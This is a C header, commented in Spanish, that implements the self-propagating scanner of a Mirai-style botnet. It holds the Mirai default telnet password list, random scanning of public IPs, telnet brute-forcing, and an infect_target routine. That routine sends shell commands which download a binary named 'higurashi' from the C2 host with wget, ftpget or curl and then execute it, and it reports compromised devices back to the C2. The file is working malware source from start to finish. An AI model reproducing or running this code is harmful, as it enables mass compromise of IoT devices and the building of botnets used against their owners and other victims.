// DISTRIBUTED SCANNER - Para BOTS únicamente
// El C2 NUNCA ejecuta esto. Solo los bots infectados escanean.
// Arquitectura: Cada bot escanea su subnet asignada y reporta al C2

#ifndef DISTRIBUTED_SCANNER_H
#define DISTRIBUTED_SCANNER_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/time.h>
#include <errno.h>
#include <time.h>

// Credenciales comunes para bruteforce (Mirai original)
typedef struct {
    const char *user;
    const char *pass;
} Credential;

static Credential telnet_creds[] = {
    {"root", "xc3511"},
    {"root", "vizxv"},
    {"root", "admin"},
    {"admin", "admin"},
    {"root", "888888"},
    {"root", "xmhdipc"},
    {"root", "default"},
    {"root", "juantech"},
    {"root", "123456"},
    {"root", "54321"},
    {"support", "support"},
    {"root", ""},
    {"admin", "password"},
    {"root", "root"},
    {"root", "12345"},
    {"user", "user"},
    {"admin", ""},
    {"root", "pass"},
    {"admin", "admin1234"},
    {"root", "1111"},
    {"admin", "smcadmin"},
    {"admin", "1111"},
    {"root", "666666"},
    {"root", "password"},
    {"root", "1234"},
    {"root", "klv123"},
    {"Administrator", "admin"},
    {"service", "service"},
    {"supervisor", "supervisor"},
    {"guest", "guest"},
    {"guest", "12345"},
    {"guest", ""},
    {"admin1", "password"},
    {"administrator", "1234"},
    {"666666", "666666"},
    {"888888", "888888"},
    {"ubnt", "ubnt"},
    {"root", "klv1234"},
    {"root", "Zte521"},
    {"root", "hi3518"},
    {"root", "jvbzd"},
    {"root", "anko"},
    {"root", "zlxx."},
    {"root", "7ujMko0vizxv"},
    {"root", "7ujMko0admin"},
    {"root", "system"},
    {"root", "ikwb"},
    {"root", "dreambox"},
    {"root", "user"},
    {"root", "realtek"},
    {"root", "00000000"},
    {"admin", "1111111"},
    {"admin", "1234"},
    {"admin", "12345"},
    {"admin", "54321"},
    {"admin", "123456"},
    {"admin", "7ujMko0admin"},
    {"admin", "1234"},
    {"admin", "pass"},
    {"admin", "meinsm"},
    {"tech", "tech"},
    {"mother", "fucker"},
    {NULL, NULL}
};

// ============================================================================
// GENERADOR DE RANGOS IP
// ============================================================================

// Genera IP pública aleatoria (evita privadas/reservadas)
void generate_random_public_ip(char *ip_out) {
    unsigned char octets[4];
    
    do {
        octets[0] = (rand() % 223) + 1;
        octets[1] = rand() % 256;
        octets[2] = rand() % 256;
        octets[3] = (rand() % 254) + 1;
        
    } while (
        (octets[0] == 10) ||
        (octets[0] == 172 && octets[1] >= 16 && octets[1] <= 31) ||
        (octets[0] == 192 && octets[1] == 168) ||
        (octets[0] == 127) ||
        (octets[0] == 169 && octets[1] == 254) ||
        (octets[0] >= 224)
    );
    
    snprintf(ip_out, 16, "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]);
}

// ============================================================================
// SCANNER DE PUERTOS RÁPIDO
// ============================================================================

int quick_port_scan(const char *ip, int port, int timeout_ms) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    
    // Non-blocking socket
    fcntl(sock, F_SETFL, O_NONBLOCK);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
    
    fd_set fdset;
    FD_ZERO(&fdset);
    FD_SET(sock, &fdset);
    
    struct timeval tv;
    tv.tv_sec = timeout_ms / 1000;
    tv.tv_usec = (timeout_ms % 1000) * 1000;
    
    int result = 0;
    if (select(sock + 1, NULL, &fdset, NULL, &tv) > 0) {
        int so_error;
        socklen_t len = sizeof(so_error);
        getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if (so_error == 0) result = 1;
    }
    
    close(sock);
    return result;
}

// ============================================================================
// BRUTEFORCE TELNET
// ============================================================================

int telnet_bruteforce(const char *ip, int port, char *user_out, char *pass_out) {
    for (int i = 0; telnet_creds[i].user != NULL; i++) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv = {.tv_sec = 3, .tv_usec = 0};
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip, &addr.sin_addr);
        
        if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        char buffer[1024];
        int n = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) {
            close(sock);
            continue;
        }
        buffer[n] = '\0';
        
        // Enviar usuario
        char login_str[128];
        snprintf(login_str, sizeof(login_str), "%s\n", telnet_creds[i].user);
        send(sock, login_str, strlen(login_str), 0);
        
        usleep(100000); // 100ms
        
        n = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (n <= 0) {
            close(sock);
            continue;
        }
        
        // Enviar password
        snprintf(login_str, sizeof(login_str), "%s\n", telnet_creds[i].pass);
        send(sock, login_str, strlen(login_str), 0);
        
        usleep(100000);
        
        n = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (n > 0) {
            buffer[n] = '\0';
            
            // Verificar login exitoso (buscar prompt o shell)
            if (strstr(buffer, "#") || strstr(buffer, "$") || strstr(buffer, ">")) {
                // Login exitoso
                strcpy(user_out, telnet_creds[i].user);
                strcpy(pass_out, telnet_creds[i].pass);
                
                // Intentar ejecutar comando de prueba
                send(sock, "echo MIRAI\n", 11, 0);
                usleep(100000);
                n = recv(sock, buffer, sizeof(buffer) - 1, 0);
                
                close(sock);
                
                if (n > 0 && strstr(buffer, "MIRAI")) {
                    return 1; // Login y ejecución confirmados
                }
                return 1; // Al menos login exitoso
            }
        }
        
        close(sock);
        usleep(50000); // 50ms entre intentos
    }
    
    return 0;
}

// ============================================================================
// AUTO-PROPAGACIÓN
// ============================================================================

int infect_target(const char *ip, int port, const char *user, const char *pass, const char *c2_host, int c2_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return 0;
    
    struct timeval tv = {.tv_sec = 5, .tv_usec = 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return 0;
    }
    
    char buffer[2048];
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Login
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "%s\n", user);
    send(sock, cmd, strlen(cmd), 0);
    usleep(100000);
    recv(sock, buffer, sizeof(buffer), 0);
    
    snprintf(cmd, sizeof(cmd), "%s\n", pass);
    send(sock, cmd, strlen(cmd), 0);
    usleep(100000);
    recv(sock, buffer, sizeof(buffer), 0);
    
    // Comandos de infección (Mirai style)
    const char *infection_cmds[] = {
        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://%s:8080/higurashi -O h; chmod +x h; ./h &\n",
        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 %s higurashi h; chmod +x h; ./h &\n",
        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl -O http://%s:8080/higurashi; chmod +x higurashi; ./higurashi &\n",
        NULL
    };
    
    int success = 0;
    for (int i = 0; infection_cmds[i] != NULL; i++) {
        snprintf(cmd, sizeof(cmd), infection_cmds[i], c2_host, c2_host);
        send(sock, cmd, strlen(cmd), 0);
        usleep(500000); // 500ms
        
        int n = recv(sock, buffer, sizeof(buffer), 0);
        if (n > 0) {
            buffer[n] = '\0';
            // Verificar si hay errores
            if (!strstr(buffer, "not found") && !strstr(buffer, "error")) {
                success = 1;
                break;
            }
        }
    }
    
    close(sock);
    return success;
}

// ============================================================================
// SCANNER DISTRIBUIDO (Thread)
// ============================================================================

typedef struct {
    int targets_per_round;
    int scan_interval;
    void (*report_callback)(const char *type, const char *message);
    char c2_host[64];
    int c2_port;
} ScannerConfig;

void *distributed_scanner_thread(void *arg) {
    ScannerConfig *config = (ScannerConfig *)arg;
    
    srand(time(NULL) ^ getpid());
    
    int round = 0;
    int total_scanned = 0;
    int total_found = 0;
    int total_infected = 0;
    
    while (1) {
        round++;
        
        char report[512];
        snprintf(report, sizeof(report), "Starting round %d", round);
        if (config->report_callback) {
            config->report_callback("scanner_start", report);
        }
        
        for (int i = 0; i < config->targets_per_round; i++) {
            char target_ip[16];
            generate_random_public_ip(target_ip);
            
            // Escanear puertos comunes
            int ports[] = {23, 2323, 80, 8080, 22, 0};
            for (int p = 0; ports[p] != 0; p++) {
                if (quick_port_scan(target_ip, ports[p], 2000)) {
                    total_found++;
                    
                    snprintf(report, sizeof(report), "OPEN: %s:%d", target_ip, ports[p]);
                    if (config->report_callback) {
                        config->report_callback("target_found", report);
                    }
                    
                    // Si es Telnet, intentar bruteforce
                    if (ports[p] == 23 || ports[p] == 2323) {
                        char user[64], pass[64];
                        if (telnet_bruteforce(target_ip, ports[p], user, pass)) {
                            snprintf(report, sizeof(report), "CREDS: %s:%d [%s:%s]", 
                                     target_ip, ports[p], user, pass);
                            if (config->report_callback) {
                                config->report_callback("credentials_found", report);
                            }
                            
                            // Auto-infectar
                            if (infect_target(target_ip, ports[p], user, pass, 
                                              config->c2_host, config->c2_port)) {
                                total_infected++;
                                
                                snprintf(report, sizeof(report), 
                                         "INFECTED: %s:%d (Total: %d)", 
                                         target_ip, ports[p], total_infected);
                                if (config->report_callback) {
                                    config->report_callback("infection_success", report);
                                }
                            }
                        }
                    }
                }
                
                total_scanned++;
                
                // Reportar progreso cada 100 escaneos
                if (total_scanned % 100 == 0) {
                    snprintf(report, sizeof(report), 
                             "Progress: %d scanned, %d found, %d infected", 
                             total_scanned, total_found, total_infected);
                    if (config->report_callback) {
                        config->report_callback("progress", report);
                    }
                }
            }
            
            usleep(10000); // 10ms entre targets (anti-flood)
        }
        
        // Esperar antes del siguiente round
        sleep(config->scan_interval);
    }
    
    return NULL;
}

#endif // DISTRIBUTED_SCANNER_H
